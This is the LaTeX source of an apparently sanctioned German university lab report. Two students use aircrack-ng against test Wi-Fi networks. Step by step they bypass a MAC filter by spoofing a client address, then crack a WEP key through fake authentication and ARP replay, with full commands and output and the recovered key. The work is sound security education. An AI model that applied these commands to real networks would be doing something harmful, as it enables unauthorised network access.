\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{todo}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}
\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 1 - WLAN}
\begin{document}
\maketitle
 
\section{Aufgabe 1}

Wir verwenden in dieser Aufgabe aircrack-ng um in die WLANs einzudringen. Die WLAN-Karte hat in dieser Aufgabe die Bezeichnung \texttt{wlan1}
Nachdem wir die WLAN-Karte laut aircrack-ng Tutorial eingerichtet haben, bringen wir sie mittels
\texttt{airmon-ng start wlan1} in den Monitormode. Mittels \texttt{airodump-ng mon7} haben wir folgende Channels und BSSIDs bestimmt:
\begin{verbatim}
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                 
                                                                                                                                                                                
 64:70:02:1C:4F:13  -22       32        0    0   3  54   WPA2 CCMP   PSK  SecureBernd                                                                                           
 64:70:02:1A:B1:81  -25       41        0    0   2  54   WEP  WEP         Bernd                                                                                                 
 64:70:02:1C:4F:3A  -26       62        0    0   1  54   OPN              OpenBernd                                                                                             
....(Die gleichen Daten für einige webauth und eduroam Access Points.)....
\end{verbatim}
Die MAC Adresse der benutzten WLAN Karte lautet ist \texttt{00:C0:CA:55:54:5F}.
Die Daten zeigen, dass SecureBernd im WPA2 Modus betrieben wird, Bernd mittels WEP gesichert ist und das Netzwerk OpenBernd nicht gesichert ist. Ein erster Verbindungsversuch zu OpenBernd scheitert. Anscheinend wird eine Zugangskontrolle mittels MAC Filter vorgenommen. Da uns kein Angriff auf WPA2 bekannt ist, konzentrieren wir uns auf die Netzwerke OpenBernd und Bernd.

\subsection{Angriff auf OpenBernd}

Mittels \texttt{airodump-ng -w output mon8} beobachteten wir den WLAN Netzwerkverkehr. Das Interface \texttt{mon8} war das Zugangsinterface zum Interface \texttt{wlan1} im Monitormode. Die folgende Zeile fiel aus dabei auf. Ein Gerät mit der MAC Adresse \texttt{00:C0:CA:55:54:5C} hat sich versucht am Netzwerk \texttt{OpenBernd} anzumelden.
\begin{small}
\begin{verbatim}
Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
....
00:C0:CA:55:54:5C, 2013-11-11 16:39:42, 2013-11-11 16:39:42, -61,        1, 64:70:02:1C:4F:3A, OpenBernd
...
\end{verbatim}
\end{small}
Nach dem wir mittels \texttt{ip link set dev wlan1 address 00:C0:CA:55:54:5C} die MAC Adresse unseres Interface \texttt{wlan1} geändert hatten, konnten wir uns mit dem Netz \texttt{OpenBernd} verbinden.

\subsection{Angriff auf Bernd}


Als erstes haben wir mit dem folgenden Kommando überprüft, ob wir in das Netzwerk Bernd Packete injizieren können.
\begin{verbatim}
aireplay-ng --test -e Bernd -a 64:70:02:1A:B1:81 --ignore-negative-one wlan1
\end{verbatim}
Da unser Client nicht am Access Point authentifiziert ist, führen wir mittels eine Fakeauthentifizierung durch.
\begin{verbatim}
aireplay-ng  -1 0 -e Bernd -a 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F --ignore-negative-one wlan1
\end{verbatim}
Dannach schnitten wir alle Packete im Netzwerk mit:
\begin{verbatim}
airodump-ng -c 2 --bssid 64:70:02:1A:B1:81 -w output wlan1
\end{verbatim}

Um die Menge an beobachteten Packeten zu erhöhen fuhren wir eine ARP Replayattacke. Dabei wird jedes abgefangene Packet wieder in das Netzwerk eingespielt.
\begin{verbatim}
aireplay-ng -3 -b 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F wlan1
\end{verbatim}
Nach circa 10 Minuten Packete mitschneiden knackten wir auf Basis der mitgeschnittenen Packete den WEP PreSharedKey:
\begin{verbatim}
aircrack-ng -b 64:70:02:1A:B1:81 output*.cap
\end{verbatim}
\begin{tiny}
\begin{verbatim}
                                                                 [00:00:00] Tested 835 keys (got 93526 IVs)

   KB    depth   byte(vote)
    0    0/ 25   71(122112) F5(107008) 3B(105216) 1B(103680) 94(103424) 90(103168) 3A(102656) A6(102656) 59(102400) CA(102400) 45(102144) 8B(101376) 9B(101120) 56(100864) 
    1    1/  1   E6(108288) 64(106496) 48(105472) 08(104960) 93(103936) 16(103424) 6B(103168) 92(102912) AA(102912) 74(102656) 56(102400) D9(102400) 9A(102144) 9F(102144) 
    2    0/  1   F9(131328) EF(108288) D0(107264) DF(107264) D2(105984) D9(105216) 02(104448) 7C(103936) E2(103168) 12(102912) C6(102912) 1A(102144) AB(102144) EA(102144) 
    3    0/  1   47(136960) 35(107776) 6B(106240) 74(106240) A2(106240) 08(105984) 70(104960) A3(104192) BE(103168) 22(102656) 31(102656) 87(102656) A8(102656) E8(102656) 
    4   14/  4   50(102144) 93(101632) 40(101120) B5(100864) 17(100608) 44(100608) 5B(100352) 75(100352) 18(100096) A3(100096) 55(99584) E3(99584) 26(99328) 65(99328) 

     KEY FOUND! [ 71:32:56:4E:4B:7A:31:47:73:52:71:59:41 ] (ASCII: q2VNKz1GsRqYA )
	Decrypted correctly: 100%
\end{verbatim}
\end{tiny}
Der verwendete WEP Key im Netzwerk Bernd lautet also: \texttt{q2VNKz1GsRqYA}.
%http://www.aircrack-ng.org/doku.php?id=simple_wep_crack#step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel
\end{document}